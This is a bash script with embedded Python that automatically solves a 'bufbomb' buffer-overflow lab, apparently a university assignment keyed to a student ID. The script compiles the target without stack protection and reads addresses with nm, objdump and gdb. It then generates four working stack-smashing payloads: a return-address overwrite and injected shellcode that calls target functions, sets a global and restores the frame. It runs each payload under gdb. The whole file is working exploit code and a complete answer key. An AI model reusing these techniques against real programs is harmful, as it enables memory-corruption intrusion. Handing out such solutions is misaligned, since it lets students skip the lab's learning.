#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <student_id>"
  echo "Example: $0 U202415003"
  exit 1
fi

sid="$1"
if [[ ! "$sid" =~ ^[Uu][0-9]{9}$ ]]; then
  echo "student_id must match U######### (10 chars)."
  exit 1
fi

last_digit="${sid: -1}"
cookie_dec="${sid:1}"
cookie_hex=$(printf "0x%x" "$cookie_dec")

cd "$(dirname "$0")"

# Build with the macro matching the last digit of student id.
gcc -g -fno-stack-protector -z execstack -no-pie -D "U${last_digit}" -o bufbomb bufbomb.c buf.c verinfo.c

smoke=$(nm -n bufbomb | awk '/ smoke$/{print "0x"$1; exit}')
fizz=$(nm -n bufbomb | awk '/ fizz$/{print "0x"$1; exit}')
bang=$(nm -n bufbomb | awk '/ bang$/{print "0x"$1; exit}')
global_value=$(nm -n bufbomb | awk '/ global_value$/{print "0x"$1; exit}')

buf_off_hex=$(objdump -d bufbomb | sed -n '/<getbuf>:/,/^$/p' | sed -n 's/.*lea\s\+-0x\([0-9a-f]\+\)(%rbp).*/\1/p' | head -n 1)
if [[ -z "$buf_off_hex" ]]; then
  echo "Failed to parse getbuf stack offset."
  exit 1
fi
ret_off=$((16#$buf_off_hex + 8))
buf_off=$((16#$buf_off_hex))

# Address right after call getbuf in test()
test_cont=$(objdump -d bufbomb | sed -n '/<test>:/,/^$/p' | awk '/call.*<getbuf>/{getline; gsub(":","",$1); print "0x"$1; exit}')
if [[ -z "$test_cont" ]]; then
  echo "Failed to parse test continuation address."
  exit 1
fi

empty_file=".empty_hex.txt"
: > "$empty_file"

# Pin stack layout using setarch -R and read buffer address once in gdb.
buf_addr=$(setarch "$(uname -m)" -R gdb -q -nx -batch \
  -ex 'b getbuf' \
  -ex "run ${sid} ${empty_file} 0" \
  -ex "p/x \$rbp-0x${buf_off_hex}" \
  ./bufbomb | awk '/\$1 = 0x/{print $3; exit}')

saved_rbp=$(setarch "$(uname -m)" -R gdb -q -nx -batch \
  -ex 'b getbuf' \
  -ex "run ${sid} ${empty_file} 0" \
  -ex "p/x *(unsigned long *)\$rbp" \
  ./bufbomb | awk '/\$1 = 0x/{print $3; exit}')

if [[ -z "$buf_addr" ]]; then
  echo "Failed to obtain runtime buffer address with gdb."
  exit 1
fi

if [[ -z "$saved_rbp" ]]; then
  echo "Failed to obtain caller rbp with gdb."
  exit 1
fi

python3 - << 'PY' "$buf_off" "$ret_off" "$cookie_dec" "$smoke" "$fizz" "$bang" "$global_value" "$buf_addr" "$saved_rbp" "$test_cont"
import struct
import sys

buf_off = int(sys.argv[1])
ret_off = int(sys.argv[2])
cookie = int(sys.argv[3])
smoke = int(sys.argv[4], 16)
fizz = int(sys.argv[5], 16)
bang = int(sys.argv[6], 16)
global_value = int(sys.argv[7], 16)
buf_addr = int(sys.argv[8], 16)
saved_rbp = int(sys.argv[9], 16)
test_cont = int(sys.argv[10], 16)

def to_hex_file(path, b):
    with open(path, 'w', encoding='ascii') as f:
        f.write(' '.join(f'{x:02x}' for x in b))
        f.write('\n')

# Level 0: overwrite return address -> smoke
p0 = b'A' * ret_off + struct.pack('<Q', smoke)

# Level 1: code in buffer: mov edi,cookie ; push fizz ; ret
code1 = b'\xbf' + struct.pack('<I', cookie) + b'\x68' + struct.pack('<I', fizz) + b'\xc3'
p1 = code1 + b'A' * (ret_off - len(code1)) + struct.pack('<Q', buf_addr)

# Level 2: mov dword ptr [global_value], cookie ; push bang ; ret
code2 = b'\xc7\x04\x25' + struct.pack('<I', global_value) + struct.pack('<I', cookie) + b'\x68' + struct.pack('<I', bang) + b'\xc3'
p2 = code2 + b'A' * (ret_off - len(code2)) + struct.pack('<Q', buf_addr)

# Level 3: mov eax,cookie ; ret ; then return to test continuation
code3 = b'\xb8' + struct.pack('<I', cookie) + b'\xc3'
p3 = (
  code3
  + b'A' * (buf_off - len(code3))
  + struct.pack('<Q', saved_rbp)
  + struct.pack('<Q', buf_addr)
  + struct.pack('<Q', test_cont)
)

for idx, payload in enumerate((p0, p1, p2, p3)):
    to_hex_file(f'level{idx}.txt', payload)
PY

{
  echo "student_id: ${sid}"
  echo "cookie: ${cookie_hex}"
  echo "smoke: ${smoke}"
  echo "fizz: ${fizz}"
  echo "bang: ${bang}"
  echo "global_value: ${global_value}"
  echo "buf_offset_hex: 0x${buf_off_hex}"
  echo "ret_offset: ${ret_off}"
  echo "buf_addr: ${buf_addr}"
  echo "saved_rbp: ${saved_rbp}"
  echo "test_cont: ${test_cont}"
} > solve_info.txt

for lvl in 0 1 2 3; do
  echo "===== level ${lvl} ====="
  setarch "$(uname -m)" -R gdb -q -nx -batch \
    -ex "run ${sid} level${lvl}.txt ${lvl}" \
    ./bufbomb
done | tee solve_run.log

echo "Done. Generated: level0.txt level1.txt level2.txt level3.txt solve_info.txt solve_run.log"
